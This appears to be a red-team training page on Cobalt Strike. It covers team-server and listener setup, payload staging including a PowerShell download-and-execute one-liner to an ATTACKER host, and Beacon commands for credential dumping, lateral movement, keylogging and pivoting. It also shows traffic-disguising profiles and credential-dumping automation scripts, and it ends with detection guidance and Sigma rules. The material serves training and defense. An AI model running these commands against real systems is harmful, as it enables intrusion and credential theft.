---
layout: training-page
title: "Cobalt Strike — Red Team Academy"
module: "C2 Frameworks"
tags:
  - cobalt-strike
  - beacon
  - c2
  - red-team
page_key: "c2-cobalt-strike"
render_with_liquid: false
---

# Cobalt Strike

## Overview

Cobalt Strike is the industry-standard commercial red team platform. Its agent (**Beacon**) is designed for long-haul operations: low-and-slow check-ins, malleable network profiles that blend with legitimate traffic, peer-to-peer chaining, and a scriptable automation layer (Aggressor Script). Understanding Cobalt Strike is essential for red teamers and defenders alike — it's the tool most commonly referenced in threat intelligence reports and incident response findings.

Cobalt Strike requires a licensed team server. This page covers architecture, workflow, and Beacon commands based on public documentation and training materials.

![Cobalt Strike architecture: operator connects to team server, which manages HTTP, DNS, and SMB pipe beacons on target hosts via redirectors](/images/c2-frameworks/cobalt-strike-arch.svg)  
*// cobalt strike architecture — team server, listeners, and beacon variants*

## Architecture — Team Server and Client

Cobalt Strike uses a client/server model. The team server runs on a Linux VPS and manages all Beacon connections. Multiple operators connect via the Cobalt Strike GUI client.

```
# Start team server (Linux VPS):
./teamserver ATTACKER_IP PASSWORD [malleable_c2_profile.profile]

# Example:
./teamserver 203.0.113.5 SuperSecretPass /opt/profiles/jquery.profile

# Connect with CS client:
# Host: 203.0.113.5  Port: 50050  User: operator  Password: SuperSecretPass

# Recommended infrastructure setup:
# - Redirectors (Apache mod_rewrite, nginx, CDN) in front of team server
# - Separate team server from redirectors
# - Use a domain with categorized history for C2 traffic blending
# - Redirectors forward only valid Beacon traffic; block everything else
```

## Listeners

Listeners define how Beacons call home. Create listeners before generating payloads.

```
># Listener types in Cobalt Strike:

# HTTP/S Listeners:
# Cobalt Strike → Listeners → Add
# Name: http-redirector
# Payload: Beacon HTTP
# HTTP Hosts: your.redirector.com
# HTTP Port (C2): 80
# HTTP Port (Bind): 80

# DNS Listener (useful when HTTP/S blocked):
# Payload: Beacon DNS
# DNS Hosts: ns1.yourdomain.com
# DNS Host (Stager): stager.yourdomain.com
# Beacon DNS TTL: 1

# SMB Listener (peer-to-peer, no direct internet needed):
# Payload: Beacon SMB
# SMB Named Pipe: \\.\pipe\msagent_01   # customize to blend in

# TCP Listener (direct bind):
# Payload: Beacon TCP
# Port: 4444

# Listener best practice: name listeners descriptively
# (e.g., "http-aws-redirector", "smb-internal") for multi-operator clarity
```

## Payload Generation and Staging

Cobalt Strike generates staged and stageless payloads in multiple formats. Stageless payloads are larger but don't require a second-stage pull — better for restrictive egress environments.

```
# Payload generation: Cobalt Strike → Attacks → Packages

# Windows Executable (stageless — recommended):
# Attacks → Packages → Windows Executable (S)
# Listener: http-redirector
# Output: EXE (or DLL, raw shellcode)
# x64 architecture for modern targets

# PowerShell payload (staged — pulls second stage via HTTP):
# Attacks → Packages → HTML Application (HTA) or PowerShell

# Shellcode for injection:
# Attacks → Packages → Windows Executable (S)
# Output: Raw shellcode → inject into process with your loader

# Scripted web delivery (serves payload via HTTP):
# Attacks → Web Drive-by → Scripted Web Delivery
# URI: /update
# Payload: PowerShell one-liner pulls and executes Beacon
# PowerShell one-liner output:
# powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://ATTACKER/update'))"

# Stage via SMB (for air-gapped or internally-only machines):
# Generate SMB Beacon payload, deploy it on a host that has
# a Beacon already calling out — chain internally via named pipe
```

## Beacon Commands

Once a Beacon checks in, interact with it from the Beacon console. Beacon runs commands asynchronously — they execute on the next check-in unless running in interactive mode.

```
# Situational awareness:
sleep 0            # set interactive mode (immediate response, noisy)
sleep 60 30        # 60s sleep, 30% jitter (stealthy, asynchronous)

whoami             # current user
getuid             # same — user context
shell whoami /all  # full token info via cmd.exe

hostname           # target hostname
sysinfo            # OS, build, arch

# Process list and migration:
ps                 # list processes with PID, user, integrity, path
inject 1234 x64    # inject Beacon into PID 1234
migrate 1234       # migrate (Meterpreter-style alias in some contexts)

# Credential operations:
logonpasswords     # Mimikatz sekurlsa::logonpasswords
hashdump           # SAM hashes
dcsync DOMAIN\Administrator    # DCSync (Mimikatz lsadump::dcsync)
make_token DOMAIN\Administrator Password1!    # impersonate via login

# File operations:
ls                             # list current directory
download C:\path\to\file.txt   # pull file to team server
upload /local/tool.exe         # push file to Beacon working dir
shell copy file.exe C:\Windows\Temp\

# Lateral movement (via jump):
jump psexec    TARGET LISTENER    # PsExec — creates service
jump psexec64  TARGET LISTENER    # PsExec64
jump winrm     TARGET LISTENER    # WinRM (PowerShell remoting)
jump winrm64   TARGET LISTENER

# Remote execution without spawning new Beacon:
remote-exec wmi    TARGET "cmd.exe /c whoami"
remote-exec winrm  TARGET "Get-Process"
remote-exec psexec TARGET "cmd.exe /c net user"

# Keylogger:
keylogger          # start in current process
keystrokes         # view captured keystrokes

# Screenshots and interaction:
screenshot         # take screenshot
desktop            # interactive VNC-like view (requires Java client)

# Port forward:
rportfwd 8080 10.10.10.5 80    # forward 8080 on team server → 10.10.10.5:80
```

## SOCKS Proxy and Pivoting

Beacon can act as a SOCKS proxy, routing attacker traffic through the compromised host into internal subnets.

```
# Start SOCKS5 proxy through Beacon (in Beacon console):
socks 1080         # SOCKS4 on port 1080
socks 1080 socks5  # SOCKS5

# Or via GUI: right-click Beacon → Pivoting → SOCKS Server

# Configure proxychains (/etc/proxychains4.conf):
# socks5 127.0.0.1 1080

# Route tools through Beacon:
proxychains nmap -sV -p 445 10.10.10.0/24
proxychains impacket-psexec DOMAIN/Administrator:PASSWORD@10.10.10.10
proxychains evil-winrm -i 10.10.10.10 -u Administrator -H NTLMHASH

# Stop SOCKS proxy:
socks stop
```

## SMB Beacon — Peer-to-Peer Chaining

SMB Beacons communicate over named pipes with a parent Beacon rather than directly to the team server. Ideal for hosts without internet access, reducing the number of direct C2 connections.

```
# Deploy SMB Beacon onto a host reachable by an existing HTTP Beacon:
# 1. Generate SMB Beacon payload (listener: smb-internal)
# 2. Transfer payload to target host via existing HTTP Beacon:
upload /tmp/smb_beacon.exe
shell move smb_beacon.exe C:\Windows\Temp\update.exe

# 3. Execute it — child Beacon connects to parent via named pipe:
shell C:\Windows\Temp\update.exe

# 4. Link parent to child (in parent Beacon console):
link TARGET \\.\pipe\msagent_01

# Chain visualization:
# Internet → Team Server ←→ HTTP Beacon (internet-facing host)
#                                   ↕ named pipe
#                            SMB Beacon (internal host, no internet)
```

## Malleable C2 Profiles

Malleable C2 profiles control every aspect of Beacon's network traffic — URI paths, HTTP headers, User-Agent strings, response patterns. A good profile makes Beacon traffic indistinguishable from legitimate application traffic.

```
># Example malleable profile snippet (jquery.profile):
set sleeptime "60000";     # 60 second default sleep
set jitter "20";           # 20% jitter

http-get {
    set uri "/jquery-3.3.1.min.js";
    client {
        header "Accept" "text/html,application/xhtml+xml";
        header "Host" "code.jquery.com";
        metadata {
            base64url;
            prepend "?__cfduid=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "max-age=2592000";
        output {
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors */";
            print;
        }
    }
}

# Load profile at team server start:
./teamserver ATTACKER_IP PASSWORD /opt/profiles/jquery.profile

# Validate profile before use:
./c2lint /opt/profiles/jquery.profile
```

## Aggressor Script Basics

Aggressor Script is Cobalt Strike's built-in scripting language for automation, custom commands, and workflow hooks. Scripts run in the CS client and interact with the team server via its API.

```
># Load a script: Cobalt Strike → Script Manager → Load

# Simple Aggressor script — auto-run recon on new Beacon:
on beacon_initial {
    local('$bid');
    $bid = $1;
    blog($bid, "New Beacon! Running initial recon...");
    bsleep($bid, 0, 0);
    bshell($bid, "whoami /all && ipconfig /all && net user");
    bps($bid);
}

# Auto-inject Mimikatz on SYSTEM Beacons:
on beacon_initial {
    if (binfo($1, "user") eq "*SYSTEM") {
        blog($1, "SYSTEM beacon — dumping creds");
        bmimikatz($1, "sekurlsa::logonpasswords");
    }
}

# Common Aggressor functions:
# bshell($bid, "command")         — run via cmd.exe
# bpowershell($bid, "ps-command") — run PowerShell
# bmimikatz($bid, "module::cmd")  — Mimikatz passthrough
# blog($bid, "message")           — log to Beacon console
# binject($bid, $pid, $arch)      — inject shellcode into PID
```

## Detection

### Event Log Sources
- **Event ID 4688** (Process Creation) — Beacon's default post-exploitation commands spawn child processes from the injected parent. Classic chain: `word.exe` → `rundll32.exe` → `cmd.exe` → `net.exe` / `whoami.exe`. Enable command line auditing; any office application spawning cmd/powershell is a high-confidence signal.
- **Event ID 4624 / 4648** (Logon Events) — Beacon's `jump winrm`, `jump psexec`, and `make_token` operations generate logon events on target hosts; `make_token` generates Event 4648 (explicit credential use).
- **Event ID 7045** (Service Created) — `jump psexec` and `jump psexec64` create a service on the target host with a random name pointing to a Beacon payload. Event 7045 with a random 6-character service name and binary path in `\Windows\` temp locations is a Beacon artifact.
- **Event ID 4769** (Kerberos TGS Request) — Beacon's `dcsync` and Kerberos ticket operations generate 4769 events; `make_token` followed by Kerberos activity shows the forged identity.

### Sysmon Events
- **Event ID 17/18 (Named Pipe Created/Connected)** — Beacon SMB uses named pipes for peer-to-peer communication. Default Cobalt Strike pipe names: `msagent_*`, `postex_*`, `status_*`, `MSSE-*-server`. Custom profiles change these, but default-profile Beacons are reliably detected by these patterns.
- **Event ID 8 (CreateRemoteThread)** — Beacon's `inject` and `spawn` commands create remote threads; `SourceImage` will be the Beacon's hosting process and `TargetImage` will be the injection target.
- **Event ID 3 (Network Connection)** — Beacon HTTP/S callbacks: outbound connections from an injected process (e.g., `svchost.exe`, `explorer.exe`) to external IPs on port 80/443. Key signal: connections at regular intervals (default 60-second sleep) with low data volume. DNS Beacon generates periodic DNS queries for subdomains of the C2 domain.
- **Event ID 1 (Process Creation)** — Beacon's `execute-assembly` and `shell` commands spawn `rundll32.exe` or `cmd.exe` as sacrificial processes. Parent-child: injected process → `rundll32.exe` with no command line arguments is a Beacon execute-assembly artifact.

### Key Indicators
- **Default named pipe patterns**: `\\.\pipe\msagent_*`, `\\.\pipe\postex_*`, `\\.\pipe\status_*` — these are Cobalt Strike default SMB Beacon pipe names; any process creating or connecting to these pipes is a near-certain Beacon indicator
- **60-second callback interval with 0% jitter** — Beacon default `sleep 60` with no jitter creates perfectly periodic outbound HTTP/S connections; network monitoring for exact-interval beaconing is a reliable detection method
- **HTTPS to a new/uncategorized domain** — Beacon C2 domains are often recently registered, uncategorized, or categorized as a common benign category (news, tech) with no prior history at the organization; combine with JA3/JA3S TLS fingerprint matching
- **Cobalt Strike default JA3S fingerprints**: `ae4edc6faf64d08308082ad26be60767` and `fd4bc6cea4877646ccd62f0792ec0b62` — these are the server-side TLS fingerprints of Cobalt Strike's default HTTPS listener; custom profiles and malleable C2 can change this but defaults are common
- **Suspicious parent-child chains**: `winword.exe` / `excel.exe` / `outlook.exe` → `cmd.exe` → `net.exe`; `mshta.exe` → `powershell.exe`; `regsvr32.exe` with no arguments → outbound HTTPS
- **`rundll32.exe` with no command line arguments** — Beacon uses `rundll32.exe` as a sacrificial process for `execute-assembly`; legitimate `rundll32.exe` always has a DLL and export in its command line

### Sigma Rule Concept
```yaml
# Sigma concept — Cobalt Strike default SMB Beacon named pipe
title: Cobalt Strike Default SMB Beacon Named Pipe Pattern
status: experimental
logsource:
    product: windows
    category: pipe_created  # Sysmon Event ID 17
detection:
    selection:
        EventID: 17
        PipeName|startswith:
            - '\msagent_'
            - '\postex_'
            - '\status_'
            - '\MSSE-'
            - '\mojo.'    # Chrome named pipe used by CS profiles
    condition: selection
falsepositives:
    - None expected for default pipe names
level: critical

# Beacon beaconing pattern (requires network data / proxy logs):
title: Periodic HTTP Beaconing at Regular Intervals
# Requires proxy/firewall log correlation over time
# Alert: same source IP making HTTP/S requests to same destination
#        at intervals of 55-65 seconds (60s ± jitter) for > 5 occurrences
level: high

# Office application spawning shell:
title: Suspicious Child Process from Office Application
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\outlook.exe'
            - '\powerpnt.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\wscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
    condition: selection
level: high
```

### EDR Behavior Alerts
- **CrowdStrike Falcon**: "Cobalt Strike Beacon" — Falcon has specific detections for CS Beacon behaviors including named pipe patterns, default sleep intervals, and `execute-assembly` process spawning; also detects malleable C2 profiles via memory scanning for Beacon configuration blocks
- **SentinelOne**: "Cobalt Strike Activity" — detects Beacon injection patterns, named pipes, and the characteristic `rundll32.exe` sacrificial process; also detects reflective DLL loading used by Beacon's in-memory staging
- **Microsoft Defender for Endpoint**: "Cobalt Strike implant" / "Suspicious Cobalt Strike activity" — MDE detects Beacon via memory scanning for the known Beacon configuration structure (XOR-encoded config blob), named pipe patterns, and process behavior chains
- **Network-based detection**: JA3/JA3S TLS fingerprint matching in network security monitoring tools (Zeek, Suricata) reliably identifies default Cobalt Strike HTTPS profiles; custom profiles and CDN redirectors can evade this

### Defensive Countermeasures
- **Network monitoring for beaconing patterns** — deploy a proxy or network sensor that can calculate connection periodicity; Beacon's sleep intervals create statistically detectable beacon patterns even with jitter
- **JA3/JA3S TLS fingerprinting** — deploy Zeek or Suricata with JA3 libraries on network egress points; Cobalt Strike default profiles have well-known JA3S fingerprints that can be blocked or alerted on
- **DNS monitoring** — log and analyze all internal DNS queries; Beacon DNS channels generate distinctive subdomain patterns; newly registered or low-reputation domains receiving regular DNS queries are suspicious
- **Named pipe monitoring** — Sysmon Event ID 17/18 with alerting on known Cobalt Strike pipe name patterns; this is the highest-confidence detection for SMB Beacon activity
- **Memory scanning** — periodic scanning of process memory for the Cobalt Strike Beacon configuration structure (detectable even if the binary is obfuscated); tools like BeaconEye, cs-decrypt-metadata, and YARA rules cover this
- **Application control** — prevent `rundll32.exe` with no arguments, block unsigned DLL loading, and restrict office applications from spawning child processes (ASR rules)
- **Egress filtering** — limit outbound HTTP/S to approved proxies; direct outbound connections from workstations to external IPs on port 443 should be blocked and alert on bypass attempts
